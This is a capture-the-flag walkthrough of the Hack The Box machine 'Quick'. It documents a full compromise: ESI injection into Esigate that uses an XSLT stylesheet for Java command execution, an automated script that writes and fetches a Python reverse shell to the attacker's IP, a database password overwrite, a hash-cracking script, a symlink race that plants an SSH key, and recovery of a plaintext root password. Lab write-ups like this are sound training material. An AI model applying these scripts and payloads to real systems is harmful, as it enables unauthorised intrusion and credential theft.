# Quick

## User

### nmap

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Quick | Broadband Services
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### webserver - quick.htb:9001

clients

```
Tim (Qconsulting Pvt Ltd)
Roy (DarkWng Solutions)
Elisa (Wink Media) Quick4cc3$$
James (LazyCoop Pvt Ltd)

No.	Client	            Country
1	QConsulting Pvt Ltd	UK
2	Darkwing Solutions	US
3	Wink	UK
4	LazyCoop Pvt Ltd	China
5	ScoobyDoo	Italy
6	PenguinCrop	France
```

Two testimonials mention names, companies, and their countries of origin. Maybe we can guess some emails for logins:

- james@lazycoop.cn
- roy@darkwingsolutions.com
- roy@darkwingsolutions.us
- tim@qconsulting.co.uk
- elisa@winkmedia.co.uk
- elisa@wink.co.uk

Login page at `http://portal.quick.htb:9001/login.php`

Response headers are interesting

```
HTTP/1.1 200 OK
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
Via: 1.1 localhost (Apache-HttpClient/4.5.2 (cache))
X-Powered-By: Esigate
Content-Length: 4345
```

Esigate looks to be vulnerable(https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) but we need to be able to reflect tags and
there's nothing that allows that yet. Perhaps we can do it later on.

There's text that states _We are migrating our portal with latest TLS and HTTP support. To read more about our services, please navigate to our portal_, and a link to https://portal.quick.htb.

### portal.quick.htb

#### Connecting

We know from our earlier nmap scan that port 443 isn't open. Given that the box is named quick, and the little
snippet talks about the latest TLS and HTTP support, perhaps it's referring to http/3, which uses [QUIC](https://en.wikipedia.org/wiki/QUIC).  It uses
UDP so lets use nmap to check.

```shell
╭─zoey@nomadic ~/htb/travel ‹master*›
╰─$ sudo nmap -sU -v -p 443 quick.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-23 23:05 PDT
Initiating Ping Scan at 23:05
Scanning quick.htb (10.10.10.186) [4 ports]
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 100.00% done; ETC: 23:05 (0:00:00 remaining)
Completed Ping Scan at 23:05, 0.12s elapsed (1 total hosts)
Initiating UDP Scan at 23:05
Scanning quick.htb (10.10.10.186) [1 port]
Completed UDP Scan at 23:05, 0.84s elapsed (1 total ports)
Nmap scan report for quick.htb (10.10.10.186)
Host is up (0.078s latency).

PORT    STATE         SERVICE
443/udp open|filtered https

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
           Raw packets sent: 6 (342B) | Rcvd: 1 (40B)
```

Success.  Now we need a way to access it. Firefox nightly and chrome don't seem to work. Maybe we need something a little lower level.
Let's try curl. A bit of searching shows we'd need to compile the support into curl, however there's a [docker image](https://hub.docker.com/r/ymuski/curl-http3) available where someone's
already done it for us. Lets give it a go.

```shell
╭─zoey@parrot-virtual ~/dev/public-write-ups ‹master› 
╰─$ docker run -it --rm ymuski/curl-http3 curl -ILv https://10.10.10.186 --http3
*   Trying 10.10.10.186:443...
* Sent QUIC client Initial, ALPN: h3-29,h3-28,h3-27
* Connected to 10.10.10.186 (10.10.10.186) port 443 (#0)
* h3 [:method: HEAD]
* h3 [:path: /]
* h3 [:scheme: https]
* h3 [:authority: 10.10.10.186]
* h3 [user-agent: curl/7.73.0-DEV]
* h3 [accept: */*]
* Using HTTP/3 Stream ID: 0 (easy handle 0x55725496da20)
> HEAD / HTTP/3
> Host: 10.10.10.186
> user-agent: curl/7.73.0-DEV
> accept: */*
> 
< HTTP/3 200
HTTP/3 200
< server: nginx/1.16.1
server: nginx/1.16.1
< date: Sun, 31 Jan 2021 04:52:03 GMT
date: Sun, 31 Jan 2021 04:52:03 GMT
< content-type: text/html; charset=UTF-8
content-type: text/html; charset=UTF-8
< x-powered-by: PHP/7.4.3
x-powered-by: PHP/7.4.3
< alt-svc: h3-23=":443"; ma=86400
alt-svc: h3-23=":443"; ma=86400
* Connection #0 to host 10.10.10.186 left intact
```

#### Enumeration

The index page has a few links:

```html
<html>
<title> Quick | Customer Portal</title>
<h1>Quick | Portal</h1>
<body>
<p> Welcome to Quick User Portal</p>
<ul>
  <li><a href="index.php">Home</a></li>
  <li><a href="index.php?view=contact">Contact</a></li>
  <li><a href="index.php?view=about">About</a></li>
  <li><a href="index.php?view=docs">References</a></li>
</ul>
</html>
```

Navigating the site via curl, on the `index.php?view=docs` page we eventually find a link to a file, `Connectivity.pdf`.

#### Connectivity.pdf

This pdf has some instructions with default credentials

```
How to Connect ?
1. Once router is up and running just navigate to http://172.15.0.4/quick_login.jsp
2. You can use your registered email address and Quick4cc3$$ as password.
3. Login and change your password for WiFi and ticketing system.
4. Don’t forget to ping us on chat whenever there is an issue.
```

### Ticketing System

We now have a default password for the login page we found on the main site, and some potential emails. Let's try variations of the emails for the
users which have had no issues(see the testimonials), meaning they probably haven't had to access the support portal, and the password might not have
been changed. Using the potential emails, we find that `elisa@wink.co.uk:Quick4cc3$$` works as a login, and we have access to the ticketing system
at [http://quick.htb:9001/home.php](http://quick.htb:9001/home.php)

#### ticket.php

We can make a ticket with an idea that we can later search. The ticket ID is TKT-####

#### search.php

Given a ticket ID we can search with the ticket id as part of the url parameter. Seems to allow all kinds of tags and XSS but can't seem to make any request hit my server. However, we know from our previous research that if we can reflect a tag, we can exploit esigate.

#### esigate

Now to take advantage of the vulnerability in esigate(https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/).  There's a number of moving parts here. First we need to sign in, run our local server to serve up the `evil.xsl` file, and submit this payload as a ticket description:

```xml
<esi:include src="http://127.0.0.1:9001/index.php" stylesheet="http://10.10.14.39.com/quick/evil.xsl">
</esi:include>
```

Then we need to make the request to `search.php` with the appropriate TKT number so that esigate processes the reflected tags. This initiates the request to our local server, which serves the `evil.xsl`, which makes the call to java's exec, giving us RCE. Once we have RCE, we can try netcat but it doesn't seem the `-e` switch works? I was unable to get the python reverse shell to run directly(probably some encoding thing), so lets upload/download a python script and then run it. Don't forget to setup the netcat listener, and be running a local server to serve the `evil.xsl` file and the python reverse shell. This script will automate most of the process, but you may need to alter the paths to get it to work.

```bash
#!/bin/sh
# Run the local http server, a netcat listener on port 22473, and then run this script for a reverse shell

# Get our IP on HTB
htbip=$(ifconfig | grep "destination 10.10" | sed 's/.*destination //')
echo "htb ip ${htbip}"

# Create a python script for a reverse shell with the HTB ip
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${htbip}',22473));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i'])" > rev-shell.py

# Put this file into the cache, I think this is required to have happened at least once
curl --silent http://quick.htb:9001/index.php > /dev/null

# Login and get a session cookie
sess=$(curl -v 'http://quick.htb:9001/login.php' --data 'email=elisa%40wink.co.uk&password=Quick4cc3%24%24' 2>&1 | grep PHPSESSID | sed 's/.*PHPSESSID=//' | sed 's/; Path=\///')
echo "Session cookie ${sess}"

# Grab a ticket value so we don't hit an existing one
tkt=$(curl 'http://quick.htb:9001/ticket.php' -H "Cookie: PHPSESSID=${sess}" | grep TKT | sed 's/.*value="TKT-//' | sed 's/"\/>//')
echo "Got ticket number ${tkt}"

# Create the ticket with the esigate exploit includes
curl --silent 'http://quick.htb:9001/ticket.php' -H "Cookie: PHPSESSID=${sess}" --data "title=title&msg=%3Cesi%3Ainclude+src%3D%22http%3A%2F%2Flocalhost%3A9001%2Findex.php%22+stylesheet%3D%22http%3A%2F%2F${htbip}%2Fquick%2Fevil.xsl%22%3E%0D%0A%3C%2Fesi%3Ainclude%3E&id=TKT-${tkt}"
echo "Ticket with esigate exploit created"

# XXE to download the python rev shell
cat part1.xsl > evil.xsl
echo "<xsl:variable name=\"cmd\"><![CDATA[wget http://${htbip}/quick/rev-shell.py]]></xsl:variable>" >> evil.xsl
cat part2.xsl >> evil.xsl
curl --silent "http://quick.htb:9001/search.php?search=${tkt}" -H "Cookie: PHPSESSID=${sess}"
echo "Python reverse shell downloaded"

# XXE to run the python reverse shell
cat part1.xsl > evil.xsl
echo "<xsl:variable name=\"cmd\"><![CDATA[python rev-shell.py]]></xsl:variable>" >> evil.xsl
cat part2.xsl >> evil.xsl
curl --silent "http://quick.htb:9001/search.php?search=${tkt}" -H "Cookie: PHPSESSID=${sess}"
echo "Connecting..."
```

The parts of the `evil.xsl` file referenced in the script are as follows:

```
part1.xsl
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>

part2.xsl
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>
```

If everything went to plan, we should now have a reverse shell.

#### reverse shell and owning user

Looking around we find we're the `sam` user, and `user.txt` is in the home directory. Let's add a public key to `~/.ssh/authorized_keys` so we can just ssh in.

## User2 and Root

### Enum

Running `linpeas.sh` we notice some interesting code in `/var/www/printer`.

```php
[+] Finding 'pwd' or 'passw' variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
...
/var/www/printer/add_printer.php:        echo '<script>alert("Invalid Username/Password");window.location.href="index.php";</script>';
/var/www/printer/escpos-php/src/Mike42/Escpos/PrintConnectors/WindowsPrintConnector.php:                if ($this -> userPassword == null) {
/var/www/printer/escpos-php/src/Mike42/Escpos/PrintConnectors/WindowsPrintConnector.php:            if ($this -> userPassword == null) {
/var/www/printer/escpos-php/src/Mike42/Escpos/PrintConnectors/WindowsPrintConnector.php:        $this -> userPassword = null;
/var/www/printer/escpos-php/src/Mike42/Escpos/PrintConnectors/WindowsPrintConnector.php:                    $this -> userPassword = $part['pass'];
/var/www/printer/home.php:        echo '<script>alert("Invalid Username/Password");window.location.href="/index.php";</script>';
/var/www/printer/index.php:<input type="password" name="password" class="form-control" id="exampleInputPassword1">
/var/www/printer/index.php:        $password = md5(crypt($password,'fa'));
/var/www/printer/index.php:        $password = $_POST["password"];
/var/www/printer/index.php:        $stmt=$conn->prepare("select email,password from users where email=? and password=?");
/var/www/printer/job.php:	echo '<script>alert("Invalid Username/Password");window.location.href="index.php";</script>';
/var/www/printer/printers.php:        echo '<script>alert("Invalid Username/Password");window.location.href="index.php";</script>';
```

Trying to figure out how to access this printer site, let's check out the apache config

```shell
sam@quick:/etc/apache2/sites-enabled$ ls -la
total 8
drwxr-xr-x 2 root root 4096 Mar 20 02:16 .
drwxr-xr-x 8 root root 4096 Mar 20 02:59 ..
lrwxrwxrwx 1 root root   35 Mar 20 02:10 000-default.conf -> ../sites-available/000-default.conf
sam@quick:/etc/apache2/sites-enabled$ cat 000-default.conf
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>
<VirtualHost *:80>
        AssignUserId srvadm srvadm
        ServerName printerv2.quick.htb
        DocumentRoot /var/www/printer
</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

Looking at the config, we see it's running as svradm, and find a new virtual host, `printerv2.quick.htb`. So let's add the host to our `/etc/hosts`, and when we access `http://printerv2.quick.htb:9001/`, we find it serves the files we found in `/var/www/printer`.

### printerv2.quick.htb

In `index.php` we find the following login code

```php
include("db.php");
if(isset($_POST["email"]) && isset($_POST["password"]))
{
        $email=$_POST["email"];
        $password = $_POST["password"];
        $password = md5(crypt($password,'fa'));
        $stmt=$conn->prepare("select email,password from users where email=? and password=?");
        $stmt->bind_param("ss",$email,$password);
        $stmt->execute();
        $result = $stmt->get_result();
        $num_rows = $result->num_rows;
        if($num_rows > 0 && $email === "srvadm@quick.htb")
        {
                session_start();
                $_SESSION["loggedin"]=$email;
                header("location: home.php");
        }
        else
        {
                echo '<script>alert("Invalid Credentials");window.location.href="/index.php";</script>';
        }
}
```

We find database credentials in db.php:

```php
<?php
$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
?>

```

We can then use them to connect to the database on the command line via `mysql -h localhost -u db_adm -pdb_p4ss quick`, and we find

```sql
mysql> select * from users;
+--------------+------------------+----------------------------------+
| name         | email            | password                         |
+--------------+------------------+----------------------------------+
| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+--------------+------------------+----------------------------------+
2 rows in set (0.00 sec)
```

Let's save the hash for later in case we can crack it and there's some password reuse, but let's just add our own password. We should be able to generate our own with

```
╭─zoey@nomadic ~/htb ‹master*›
╰─$ php -r "echo md5(crypt('password','fa'));"                                                                                               130 ↵
0c0ba48811bed85e3093bc71c6037891
```

Then let's insert it into the database

```sql
mysql> Update users set password='0c0ba48811bed85e3093bc71c6037891' where email='srvadm@quick.htb';
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0

mysql> select * from users;
+--------------+------------------+----------------------------------+
| name         | email            | password                         |
+--------------+------------------+----------------------------------+
| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| Server Admin | srvadm@quick.htb | 0c0ba48811bed85e3093bc71c6037891 |
+--------------+------------------+----------------------------------+
2 rows in set (0.00 sec)
```

Now we can login with `srvadm@quick.htb:password`.

#### Cracking The Hash

Alternatively, we can also crack the hash with the following script:

```php
<?php

$hash = 'e626d51f8fbfd1124fdea88396c35d05';

$tries = 0;
$fn = fopen($argv[1], "r");
$foundit = false;
while (!feof($fn) && !$foundit) {
    $result = trim(fgets($fn));
    $testKey = md5(crypt($result,'fa'));
    if ($testKey == $hash) {
        echo $result;
        $foundit = true;
    }
    $tries = $tries + 1;
    if ($tries % 100000 == 0) {
        echo "Tries " . $tries . ", " . $result . "\n";
    }
}

fclose($fn);
```

Then let's call it with the rockyou list:

```shell
╭─zoey@nomadic ~/htb/quick ‹master*›
╰─$ php crack-srvadm-pw.php /usr/share/wordlists/rockyou.txt
Tries 100000, sagar
Tries 200000, judyjudy
Tries 300000, mcandrew
Tries 400000, my boys
Tries 500000, johnston2
Tries 600000, plurplur
Tries 700000, alexemo
Tries 800000, saulm
Tries 900000, katey1412
Tries 1000000, budakid1
Tries 1100000, 224467
yl51pbx
```

Now we can login with `srvadm@quick.htb:yl51pbx`.

#### Quick POS Print Server (owning srvadm)

Investigating the site we see there's an ability to add printers and send jobs to them. If we take a look at the code in `job.php` it looks like it's vulnerable:

```php
if($_SESSION["loggedin"])
{
	if(isset($_POST["submit"]))
	{
		$title=$_POST["title"];
		$file = date("Y-m-d_H:i:s");
		file_put_contents("/var/www/jobs/".$file,$_POST["desc"]);
		chmod("/var/www/printer/jobs/".$file,"0777");
		$stmt=$conn->prepare("select ip,port from jobs");
		$stmt->execute();
		$result=$stmt->get_result();
		if($result->num_rows > 0)
		{
```

The script calls `file_put_contents`, writing the `desc` value into it. The `/var/www/jobs` directory is world-writeable so we can create a symlink into whatever
file we want, and have the server write what we want into it. Let's write a public ssh key into `/home/srvadm/.ssh/authorized_keys`. We'll need to create
a script to create the symlink and then make the call to the server quickly since the filename is based on the time, and includes the seconds value.  You'll need to replace the public key in the script with your own, don't forget to url encode.

```bash
#!/bin/sh

# Run this as Sam on quick.htb to add the ssh public key to srvadm's authorized_keys

sess=$(curl -v 'http://localhost:9001/index.php' -H "Host: printerv2.quick.htb" --data 'email=srvadm%40quick.htb&password=yl51pbx' 2>&1 | grep PHPSESSID | sed 's/.*PHPSESSID=//' | sed 's/;.*//')
filename=$(php -r "echo date('Y-m-d_H:i:s');")
ln -s /home/srvadm/.ssh/authorized_keys "/var/www/jobs/${filename}"
curl 'http://localhost/job.php' -H 'Host: printerv2.quick.htb' -H "Cookie: PHPSESSID=${sess}" --data 'title=Port+8081&desc=ssh%2Drsa%20AAAAB3NzaC1yc2EAAAADAQABAAABgQDIxJfGA7%2F0W9izQKEb87wTkKw3Ko83AIjcDw%2BScukapOKIYZ%2FN16ApuuC3TeFuSBrWtiIY1ZY7b35pnXsYg9zju6bb%2Fv3Qz9EBAdepxE9yjJY6yzylCUjm%2Fm%2B2vUKdnMYYMfwCmaL9EgJfXsvom6x1oZ%2BdIjykB57PyoX53P0hZ%2B1Irz3IY5xqc8einuP0X%2F50vuT42XnqRQSvCLAar2E6LPWfUc0l4GoN7lhM7l8eZ6v9Qn0Rj%2FpDLDIxf4UL4o3FdLSiV4is%2F4G1SHe5i0IUWtRmW%2BUR3h%2Bxi5Ujh7L7Xhxr99WacvIg6SydVRndBh2fC3zZKTobZDwPNR43R9MI8hSFclPo2t4kKgFn5ywd16qUDD2B%2BUtKUt%2Famotpgq8TVRVaTjICbVrJA1TEmEDO%2BNV1zo%2B6Ym5%2BHJEd8E%2Blg%2FkuhP2%2BLNJ7e39SaNDzc7coL%2F0ZCxQieu6tteVcNotUlUBGRhJo2T4vPjIGX4IydWkjcPg6WFFG%2FWUhANYMSnc%3D&submit=yup' & > /dev/null 2>&1
```

If everything went well we should be able to ssh into the `srvadm` user.

## Enum as srvadm and owning root

The usual enum isn't showing much, and we've already seen most of what's available from the other user account. Let's find stuff that `srvadm` has access to that `sam` might not

```shell
srvadm@quick:~$ find / -user srvadm 2>/dev/null | grep -v /proc | grep -v /sys
/home/srvadm
/home/srvadm/.cache
/home/srvadm/.cache/conf.d
/home/srvadm/.cache/conf.d/printers.conf
/home/srvadm/.cache/conf.d/cupsd.conf
/home/srvadm/.cache/logs
/home/srvadm/.cache/logs/debug.log
/home/srvadm/.cache/logs/error.log
/home/srvadm/.cache/logs/cups.log
/home/srvadm/.cache/packages
/home/srvadm/.cache/motd.legal-displayed
...
```

Looking in `/home/srvadm/.cache/conf.d/printers.conf` we find a line `DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer`. The
password in this URL decodes to `&ftQ4K3SGde8?` which is the root password.
